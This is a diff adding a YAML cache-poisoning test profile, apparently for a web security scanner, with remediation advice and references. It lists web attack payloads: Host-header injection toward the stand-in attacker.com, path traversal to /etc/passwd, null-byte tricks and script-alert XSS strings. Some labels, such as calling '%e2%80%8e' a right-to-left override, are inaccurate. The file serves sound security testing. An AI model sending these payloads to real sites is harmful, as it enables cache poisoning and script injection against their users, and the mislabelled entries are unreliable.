@@ -1,0 +1,142 @@
+# Cache Poisoning Attack Profile
+# This file defines payloads and techniques for testing HTTP cache poisoning vulnerabilities
+
+name: "Cache Poisoning"
+category: "cache"
+severity: "high"
+description: "Tests for HTTP cache poisoning vulnerabilities that allow attackers to inject malicious content into cached responses, affecting all users who receive the poisoned cache."
+
+# Fields and headers commonly vulnerable to cache poisoning
+target_fields:
+  - "User-Agent"
+  - "X-Forwarded-Host"
+  - "X-Original-Host"
+  - "Host"
+  - "X-Host"
+  - "X-Forwarded-For"
+  - "Accept-Language"
+  - "Accept-Encoding"
+  - "Content-Type"
+  - "search"
+  - "q"
+  - "filter"
+  - "tag"
+  - "category"
+  - "page"
+
+# Cache Poisoning Payloads
+payloads:
+  # 1. Host Header Injection
+  - "attacker.com"
+  - "attacker.com:8080"
+  - "attacker.com@legitimate.com"
+  - "legitimate.com@attacker.com"
+  - "attacker.com#@legitimate.com"
+  - "legitimate.com#attacker.com"
+  - "attacker.com.legitimate.com"
+  - "legitimate.com;attacker.com"
+  
+  # 2. X-Forwarded-Host Header Injection
+  - "X-Forwarded-Host: attacker.com"
+  - "X-Forwarded-Host: attacker.com:8080"
+  - "X-Original-Host: attacker.com"
+  - "X-Original-Host: attacker.com:443"
+  
+  # 3. Unkeyed Request Parameters (these should be cached but aren't in the key)
+  - "?utm_source=attacker&utm_medium=cache&utm_campaign=poison"
+  - "?api_key=attacker_key&data=sensitive"
+  - "?redirect_url=https://attacker.com"
+  - "?callback=attacker.com"
+  - "?ref=attacker.com"
+  
+  # 4. Cache-Control Header Manipulation
+  - "Cache-Control: public, max-age=3600"
+  - "Cache-Control: public, max-age=86400"
+  - "Cache-Control: max-age=604800"
+  - "Cache-Control: public, s-maxage=31536000"
+  
+  # 5. Character Encoding/Normalization attacks
+  - "%e2%80%8e"  # Right-to-left override (RTL)
+  - "..\\..\\..\\etc\\passwd"
+  - "..%5c..%5c..%5cwindows%5csystem.ini"
+  - "..%252f..%252f..%252fetc%252fpasswd"
+  
+  # 6. Content-Type Confusion
+  - "application/json; charset=UTF-7"
+  - "text/html; charset=UTF-7"
+  - "image/svg+xml"
+  - "application/javascript"
+  
+  # 7. Null Byte Injection (legacy vulnerabilities)
+  - "file.jpg%00.html"
+  - "image.png%00.js"
+  
+  # 8. X-Forwarded-For Header Abuse
+  - "X-Forwarded-For: 127.0.0.1"
+  - "X-Forwarded-For: attacker.com"
+  - "X-Forwarded-For: 192.168.1.1"
+  
+  # 9. Accept-Language Header Poisoning
+  - "Accept-Language: en-US,en;q=0.9,../../../etc/passwd"
+  - "Accept-Language: en-US,en;q=0.9,<script>alert(1)</script>"
+  
+  # 10. User-Agent String Poisoning
+  - "User-Agent: <script>alert('cached')</script>"
+  - "User-Agent: ../../../etc/passwd"
+
+# Success indicators to identify if cache poisoning was successful
+success_indicators:
+  - "Cache-Control: public"
+  - "Cache-Control: max-age"
+  - "Age:"
+  - "X-Cache: HIT"
+  - "Via:"
+  - "ETag:"
+  - "Set-Cookie:"
+
+# Cache-specific detection patterns
+cache_headers:
+  - "Cache-Control"
+  - "Expires"
+  - "Pragma"
+  - "Age"
+  - "X-Cache"
+  - "X-Cache-Status"
+  - "Vary"
+  - "ETag"
+  - "Last-Modified"
+
+remediation: |
+  To prevent cache poisoning vulnerabilities:
+  
+  1. Properly construct cache keys:
+     - Include all user-controllable parameters in cache key
+     - Don't trust headers like Host, X-Forwarded-Host by default
+     - Use explicit whitelist of cacheable headers
+  
+  2. HTTP Response Header Security:
+     - Set Cache-Control: private for sensitive responses
+     - Use Cache-Control: no-cache, no-store for dynamic content
+     - Set Vary header to include all parameters affecting the response
+  
+  3. Request Validation:
+     - Validate Host header against a whitelist
+     - Reject suspicious Host header formats
+     - Implement rate limiting on cache-generating requests
+  
+  4. Cache Configuration:
+     - Disable caching for authenticated responses
+     - Use Age header to identify cached responses
+     - Implement cache invalidation mechanisms
+  
+  5. Monitoring:
+     - Log cache hits/misses for suspicious patterns
+     - Monitor for unusually high cache hit ratios
+     - Alert on multiple requests with different User-Agent to same resource
+
+references:
+  - "https://portswigger.net/research/practical-web-cache-poisoning"
+  - "https://owasp.org/www-community/attacks/Cache_Poisoning"
+  - "https://cwe.mitre.org/data/definitions/444.html"
+  - "https://portswigger.net/kb/issues/00200107_cache-poisoning"
+  - "https://labs.detectify.com/web-cache-poisoning-101/"
